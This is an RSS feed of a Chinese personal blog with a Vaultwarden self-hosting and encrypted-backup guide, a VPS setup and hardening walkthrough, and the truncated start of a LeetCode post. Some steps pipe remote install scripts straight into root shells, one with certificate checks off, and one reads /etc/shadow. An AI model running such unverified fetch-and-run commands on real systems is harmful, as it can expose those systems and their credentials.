<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Braindance</title><link>https://www.braindance.top/</link><description>Recent content on Braindance</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 13 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://www.braindance.top/index.xml" rel="self" type="application/rss+xml"/><item><title>自建Vaultwarden并备份同步</title><link>https://www.braindance.top/posts/play_time/%E8%87%AA%E5%BB%BAvaultwarden%E5%B9%B6%E5%A4%87%E4%BB%BD%E5%90%8C%E6%AD%A5/</link><pubDate>Sun, 13 Apr 2025 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/%E8%87%AA%E5%BB%BAvaultwarden%E5%B9%B6%E5%A4%87%E4%BB%BD%E5%90%8C%E6%AD%A5/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;新买服务器，密码很多，保存密码，为了安全，防止被打，备份保底。&lt;/p&gt;
&lt;h2 id="前置步骤"&gt;前置步骤
&lt;/h2&gt;&lt;p&gt;自行安装1panel面板，并开启https和面板的安全配置，如防火墙、fail2ban等。或者根据配置的流程自己摸索单独配置。&lt;/p&gt;
&lt;h2 id="安装vaultwarden"&gt;安装Vaultwarden
&lt;/h2&gt;&lt;p&gt;我用的docker-composes.yaml&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;services&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;vaultwarden&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;image&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;vaultwarden/server:latest&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;container_name&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;vaultwarden&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;restart&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;unless-stopped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;ADMIN_TOKEN&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;xxxxxxxxxxxxxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;DOMAIN&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;https://vw.3306.fun&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - &lt;span style="color:#ae81ff"&gt;./vw-data/:/data/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;network_mode&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;bridge&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的&lt;code&gt;ADMIN_TOKEN&lt;/code&gt;很重要，相当于后台唯一的管理密码，虽然配置里写明文，用于第一次登录（&lt;del&gt;我不会说因为直接在容器里配置没成功&lt;/del&gt;），后面在管理面板再更改。&lt;/p&gt;
&lt;p&gt;之后创建站点反向代理容器的地址，以及开启https。&lt;/p&gt;
&lt;h2 id="设置waf和限制"&gt;设置waf和限制
&lt;/h2&gt;&lt;p&gt;在1panel的高级功能-WAF-网站设置，找到创建的站点，然后设置访问频率&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/file/2024/04/1744507809102_image.png"
loading="lazy"
alt="image.png"
&gt;&lt;/p&gt;
&lt;p&gt;然后在Cloudflare WAF中创建一个&lt;strong&gt;速率限制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/file/2024/04/pZBr6nA3.png"
loading="lazy"
alt="image.png"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/file/2024/04/nIDfbV3g.png"
loading="lazy"
alt="image.png"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;添加自定义规则设置&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;规则。阻止其他国家的访问，不想限制所有域名可以添加域名限制，我的表达式为&lt;code&gt;(http.host wildcard &amp;quot;example.com&amp;quot; and ip.src.country ne &amp;quot;CN&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置DNS记录&lt;/strong&gt;，添加记录并开启小黄云（已代理）。&lt;/p&gt;
&lt;p&gt;找到 SSL/TLS 概述，选择配置，自定义 SSL/TLS，选择完全（严格）。&lt;/p&gt;
&lt;h2 id="登录配置"&gt;登录配置
&lt;/h2&gt;&lt;p&gt;访问 &lt;a class="link" href="https://example.com/" target="_blank" rel="noopener"
&gt;https://example.com/&lt;/a&gt; 创建账户。然后访问后台地址&lt;code&gt;/admin&lt;/code&gt;输入创建docker时的&lt;code&gt;ADMIN_TOKEN&lt;/code&gt;登陆，之后&lt;strong&gt;关键步骤&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将Domain URL设置为自己的网站。&lt;/li&gt;
&lt;li&gt;Client IP header设置为“cf**-**connecting-ip”，保证只有Cloudflare访问&lt;/li&gt;
&lt;li&gt;Admin token/Argon2 PHC 选项设置为新的&lt;code&gt;ADMIN_TOKEN&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="admin后台限制"&gt;admin后台限制
&lt;/h2&gt;&lt;p&gt;因为admin页面权限过大，平时也用不到，所以可以在1panel中配置路径重定向到127.0.0.1，需要更改配置的时候关掉重定向，修改关闭再打开。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://img.braindance.top/file/2024/04/ZUOYha2U.png"
loading="lazy"
alt="image.png"
&gt;&lt;/p&gt;
&lt;h2 id="其他配置"&gt;其他配置
&lt;/h2&gt;&lt;p&gt;在Vaultwarden开启两步验证等，自行摸索。&lt;/p&gt;
&lt;h2 id="同步配置"&gt;同步配置
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Rclone&lt;/strong&gt;：用于将备份文件上传到 OneDrive。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GPG&lt;/strong&gt;：用于加密备份文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cron&lt;/strong&gt;：用于定时执行备份和更新脚本。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;安装rclone&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl https://rclone.org/install.sh | sudo bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;验证安装成功&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;rclone version
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class="link" href="https://linux.do/t/topic/238502" target="_blank" rel="noopener"
&gt;https://linux.do/t/topic/238502&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;根据帖子配置网盘：https://linux.do/t/topic/481620。最后代码修改为如下，后台挂载。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;rclone mount onedrive:/backup/ /mnt/onedrive --allow-non-empty --vfs-cache-mode full --daemon
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;配置开机自动挂载&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法1：编辑 &lt;code&gt;~/.config/autostart/rclone-onedrive.desktop&lt;/code&gt; 添加以下内容&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;[Desktop Entry]
Type=Application
Name=Mount OneDrive with rclone
Exec=rclone mount onedrive:/backup/ /mnt/onedrive --allow-non-empty --vfs-cache-mode full --daemon writes &amp;amp;
Terminal=false
Hidden=false
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;方法2：直接把挂载命令写成一个 sh 脚本文件，在 crontab 中添加配置每次开机后自动执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;@reboot /path/to/rclone-onedrive.sh
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="自动备份"&gt;自动备份
&lt;/h3&gt;&lt;p&gt;采用 sqlite3 先热备数据库，然后打包。备份计划每天一个日备份，保存在daily文件夹下，保留30份，循环覆写。每个月一个月备份，保存在monthly文件夹下，保留12份，循环覆写。注意安装依赖环境&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;apt-get install sqlite3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;脚本文件如下：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;#!/bin/bash
# 定义路径
# 数据地址
DATA_DIR=&amp;#34;/vw-data&amp;#34;
# 网盘挂载的地址
BACKUP_DIR=&amp;#34;/mnt/onedrive&amp;#34;
DAILY_BACKUP_DIR=&amp;#34;${BACKUP_DIR}/daily&amp;#34;
MONTHLY_BACKUP_DIR=&amp;#34;${BACKUP_DIR}/monthly&amp;#34;
WORK_DIR=&amp;#34;${BACKUP_DIR}/work&amp;#34;
DATE=$(date +%Y%m%d)
DAILY_BACKUP_RETENTION=30
MONTHLY_BACKUP_RETENTION=12
# 定义加密密码
GPG_PASSPHRASE=&amp;#34;your_secret_passphrase_here&amp;#34; # 你的加密密码
# 确保目标目录存在
mkdir -p &amp;#34;$DAILY_BACKUP_DIR&amp;#34; &amp;#34;$MONTHLY_BACKUP_DIR&amp;#34; &amp;#34;$WORK_DIR&amp;#34;
# Step 1: 执行SQLite3热备份
sqlite3 &amp;#34;${DATA_DIR}/db.sqlite3&amp;#34; &amp;#34;.backup &amp;#39;${WORK_DIR}/db_${DATE}.sqlite3&amp;#39;&amp;#34;
# Step 2: 打包备份文件
tar -czf &amp;#34;${WORK_DIR}/backup_${DATE}.tar.gz&amp;#34; -C &amp;#34;${WORK_DIR}&amp;#34; &amp;#34;db_${DATE}.sqlite3&amp;#34;
# Step 3: 加密备份文件
echo &amp;#34;$GPG_PASSPHRASE&amp;#34; | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 --output &amp;#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg&amp;#34; &amp;#34;${WORK_DIR}/backup_${DATE}.tar.gz&amp;#34;
# Step 4: 删除临时文件
rm &amp;#34;${WORK_DIR}/db_${DATE}.sqlite3&amp;#34; &amp;#34;${WORK_DIR}/backup_${DATE}.tar.gz&amp;#34;
# Step 5: 每月备份逻辑（每月第一天执行）
if [ &amp;#34;$(date +%d)&amp;#34; -eq 1 ]; then
cp &amp;#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg&amp;#34; &amp;#34;${MONTHLY_BACKUP_DIR}/&amp;#34;
fi
# Step 6: 保留最近的30份每日备份
cd &amp;#34;${DAILY_BACKUP_DIR}&amp;#34;
ls -tp | grep -v &amp;#39;/$&amp;#39; | tail -n +$((${DAILY_BACKUP_RETENTION}+1)) | xargs -I {} rm -- {}
# Step 7: 保留最近12个月的备份
cd &amp;#34;${MONTHLY_BACKUP_DIR}&amp;#34;
ls -tp | grep -v &amp;#39;/$&amp;#39; | tail -n +$((${MONTHLY_BACKUP_RETENTION}+1)) | xargs -I {} rm -- {}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改脚本权限&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;chmod 700 /path/to/backup.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建定时任务每天凌晨 2 点自动备份。使用crontab @reboot，记得加+x权限&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0 2 * * * /path/to/backup.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以手动运行一次脚本，检查云盘中是否有备份文件，同时重启一下服务器查看网盘是否自动挂载。&lt;/p&gt;
&lt;h3 id="恢复备份"&gt;恢复备份
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;可以同样用管道符传入密码。（&lt;strong&gt;不推荐，安全问题&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo &amp;#34;$GPG_PASSPHRASE&amp;#34; | gpg --batch --yes --passphrase-fd 0 --decrypt --output &amp;#34;${WORK_DIR}/backup_${DATE}.tar.gz&amp;#34; &amp;#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start="2"&gt;
&lt;li&gt;交互式输入密码，执行命令后会弹窗输出密码。（&lt;strong&gt;推荐&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;gpg --decrypt --output &amp;#34;${WORK_DIR}/backup_${DATE}.tar.gz&amp;#34; &amp;#34;${DAILY_BACKUP_DIR}/backup_${DATE}.tar.gz.gpg&amp;#34;
&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>ClawCloud使用体验</title><link>https://www.braindance.top/posts/vps_setup_clawcloud/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/vps_setup_clawcloud/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;快毕业了忙的飞起，上个服务器到期了我都没来得及管，现在写这篇博客还是在github的pages上，又接触了一些项目，想买个便宜好使的服务器玩玩。&lt;/p&gt;
&lt;p&gt;在论坛里搜到&lt;a class="link" href="https://claw.cloud/" target="_blank" rel="noopener"
&gt;ClawCloud&lt;/a&gt;评价不错，刚好最近有活动优惠就入手了一台系统为Debian，之前一直用的ubuntu，这下也换个玩玩。记录一下机器怎么样和自己配置过程，也边以后自己看。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;2C / 2G / 40G / 1T&lt;/th&gt;
&lt;th&gt;$25.20 USD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id="测评"&gt;测评
&lt;/h2&gt;&lt;p&gt;部分测试结果：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;VPS融合怪版本：2025.02.12
Shell项目地址：https://github.com/spiritLHLS/ecs
Go项目地址：https://github.com/oneclickvirt/ecs
---------------------基础信息查询--感谢所有开源项目---------------------
CPU 型号 : Intel(R) Xeon(R) Platinum
CPU 核心数 : 2
CPU 频率 : 2500.002 MHz
CPU 缓存 : L1: 32.00 KB / L2: 1.00 MB / L3: 33.00 MB
AES-NI指令集 : ✔ Enabled
VM-x/AMD-V支持 : ❌ Disabled
内存 : 130.84 MiB / 1.85 GiB
Swap : [ no swap partition or swap file detected ]
硬盘空间 : 911.28 MiB / 40110.19 MiB
启动盘路径 : /dev/vda1
系统在线时间 : 0 days, 0 hour 5 min
负载 : 1.02, 0.34, 0.12
系统 : Debian GNU/Linux 12 (bookworm) (x86_64)
架构 : x86_64 (64 Bit)
内核 : 6.1.0-31-cloud-amd64
TCP加速方式 : cubic
虚拟化架构 : KVM
NAT类型 : Full Cone
IPV4 ASN : AS45102 Alibaba (US) Technology Co., Ltd.
IPV4 位置 : Tokyo / Tokyo / JP
IPV6 ASN : AS45102 Alibaba
IPV6 位置 : Tokyo / Tokyo / Japan
IPV6 子网掩码 : 128
----------------------CPU测试--通过sysbench测试-------------------------
-&amp;gt; CPU 测试中 (Fast Mode, 1-Pass @ 5sec)
1 线程测试(单核)得分: 1062 Scores
2 线程测试(多核)得分: 1770 Scores
---------------------内存测试--感谢lemonbench开源-----------------------
-&amp;gt; 内存测试 Test (Fast Mode, 1-Pass @ 5sec)
单线程读测试: 5350.57 MB/s
单线程写测试: 5815.83 MB/s
------------------磁盘dd读写测试--感谢lemonbench开源--------------------
-&amp;gt; 磁盘IO测试中 (4K Block/1M Block, Direct Mode)
测试操作 写速度 读速度
100MB-4K Block 35.0 MB/s (8551 IOPS, 2.99s) 52.4 MB/s (12800 IOPS, 2.00s)
1GB-1M Block 232 MB/s (221 IOPS, 4.52s) 208 MB/s (198 IOPS, 5.04s)
---------------------磁盘fio读写测试--感谢yabs开源----------------------
Block Size | 4k (IOPS) | 64k (IOPS)
------ | --- ---- | ---- ----
Read | 20.68 MB/s (5.1k) | 96.31 MB/s (1.5k)
Write | 20.69 MB/s (5.1k) | 96.82 MB/s (1.5k)
Total | 41.37 MB/s (10.3k) | 193.13 MB/s (3.0k)
| |
Block Size | 512k (IOPS) | 1m (IOPS)
------ | --- ---- | ---- ----
Read | 91.97 MB/s (179) | 91.36 MB/s (89)
Write | 96.85 MB/s (189) | 97.44 MB/s (95)
Total | 188.82 MB/s (368) | 188.81 MB/s (184)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整测试结果连接如下：&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://paste.spiritlhl.net/#/show/WG2vI.txt" target="_blank" rel="noopener"
&gt;https://paste.spiritlhl.net/#/show/WG2vI.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="http://hpaste.spiritlhl.net/#/show/WG2vI.txt" target="_blank" rel="noopener"
&gt;http://hpaste.spiritlhl.net/#/show/WG2vI.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;咱也看不懂，也没有什么特殊需求，就部署点项目，下载包方便。&lt;/p&gt;
&lt;h2 id="配置"&gt;配置
&lt;/h2&gt;&lt;h3 id="更新组件包管理"&gt;更新组件、包管理
&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt update #这个命令会更新软件包列表，让系统知道有哪些软件包可以更新。
sudo apt upgrade --only-upgrade #这个命令会安装所有可用的软件包更新。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="bbr"&gt;BBR
&lt;/h3&gt;&lt;p&gt;BBR 是 Google 提出的一种新型拥塞控制算法（Bottleneck Bandwidth and RTT），全称为瓶颈带宽和往返传播时间。&lt;/p&gt;
&lt;p&gt;在 Linux 系统中，BBR 主要有以下特点和作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;提高网络性能&lt;/strong&gt;：它可以显著提高吞吐量和降低 TCP 连接的延迟，使数据传输更加高效。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;适应不同网络环境&lt;/strong&gt;：适合高延迟、高带宽的网络链路，以及慢速接入网络的用户，能在一定丢包率的网络链路上充分利用带宽，并降低网络链路上的缓冲区占用率从而降低延迟。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优化拥塞控制&lt;/strong&gt;：BBR 改变了传统基于丢包反馈的拥塞控制机制，通过精确测量往返传播时间（RTT）和瓶颈带宽等参数来更有效地控制数据发送速率，避免了传统算法中因单纯丢包判断拥塞而导致的带宽利用率不高和端到端延迟大等问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提升网络稳定性&lt;/strong&gt;：有助于减少网络拥塞和数据包丢失，提高网络的稳定性和可靠性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;运行代码&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;amp;&amp;amp; chmod +x bbr.sh &amp;amp;&amp;amp; ./bbr.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;重启 VPS、使内核更新和BBR设置都生效&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo reboot
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;确认bbr是否开启&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;lsmod | grep bbr
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;结果为&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;tcp_bbr 20480 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="添加sawp"&gt;添加SAWP
&lt;/h3&gt;&lt;p&gt;注意到测评结果里没有SAWP。在虚拟专用服务器（VPS）中，SWAP 是当物理内存（RAM）已被占满时用于存储数据的磁盘空间。它充当 RAM 的溢出区，允许系统将不活跃的内存页移动到 SWAP 空间，从而为活跃进程释放 RAM。这在处理占用大量内存的应用程序或同时运行多个应用程序时特别有用。然而，访问 SWAP 空间的速度比访问 RAM 慢，因为它涉及磁盘 I/O 操作。因此，虽然 SWAP 可以帮助避免内存不足错误，但应适当配置以确保 VPS 的最佳性能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用脚本添加&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget -O swap.sh https://raw.githubusercontent.com/yuju520/Script/main/swap.sh &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x swap.sh &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; clear &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./swap.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意输入SWAP的大小为单位M&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看当前内存&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;free&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt;m
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="添加用户"&gt;添加用户
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;修改root密码，创建新用户，加入sudo列表；&lt;/li&gt;
&lt;li&gt;关闭root账户登陆，普通用户开启免密登录，并关闭密码登录；&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo adduser xiaoming
sudo passwd xiaoming
echo &amp;#39;xiaoming ALL=(ALL) ALL&amp;#39; | sudo tee /etc/sudoers.d/xiaoming
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;验证&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;su xiaoming
sudo cat /etc/shadow
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果能够成功执行命令，说明 sudo 权限已正确添加&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;ssh-keygen -t rsa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后添加公钥内容到服务器&lt;code&gt;/home/user/.ssh/authorized_keys&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建议登录验证一下！！！再关闭密码登录&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id="关闭root登录用户密码登录"&gt;关闭root登录、用户密码登录
&lt;/h3&gt;&lt;p&gt;修改&lt;code&gt;/etc/ssh/sshd_config &lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PermitRootLogin no # 禁用root登录
PasswordAuthentication no #禁用用户密码登录
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果不生效了注意一下&lt;code&gt;sshd_config.d&lt;/code&gt;目录下的内容。重启ssh。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;service ssh restart
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;重启不生效就&lt;code&gt;reboot&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="修改ssh端口"&gt;修改ssh端口
&lt;/h3&gt;&lt;p&gt;修改&lt;code&gt;/etc/ssh/sshd_config &lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;#Port 22
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="安装docker"&gt;安装Docker
&lt;/h3&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;# 安装Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="安装ufw"&gt;安装ufw
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1、更新软件包&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt update
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2、安装 UFW&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt install ufw
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3、如果你在远程位置连接你的服务器，在启用 UFW 防火墙之前，你必须显式允许进来的 SSH 连接。否则，你将永远都无法连接到机器上。&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo ufw allow 22/tcp
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;如果 SSH 运行在非标准端口，你需要将上述命令中的 22 端口替换为对应的 SSH 端口。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;5、启动 UFW&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo ufw enable
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="fail2ban"&gt;fail2ban
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1、安装 Fail2ban&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt-get install fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;2、Debian 12 及以上的版本需要手动安装 rsyslog&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo apt-get install rsyslog
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3、启动 Fail2ban 服务&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo systemctl start fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;4、开机自启动&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo systemctl enable fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;5、查看 Fail2ban 服务状态。&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;sudo systemctl status fail2ban
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="评价"&gt;评价
&lt;/h2&gt;&lt;p&gt;好使的一。官网也有测试的探针，我这是东京的比香港的好使点。终端的体验感觉也比rn的好多了。如果可以的话就传家宝了。&lt;/p&gt;</description></item><item><title>菜鸡解题1</title><link>https://www.braindance.top/posts/leetcode/2024_09_02/</link><pubDate>Mon, 02 Sep 2024 00:00:00 +0000</pubDate><guid>https://www.braindance.top/posts/leetcode/2024_09_02/</guid><description>&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;关键：题目中关键信息
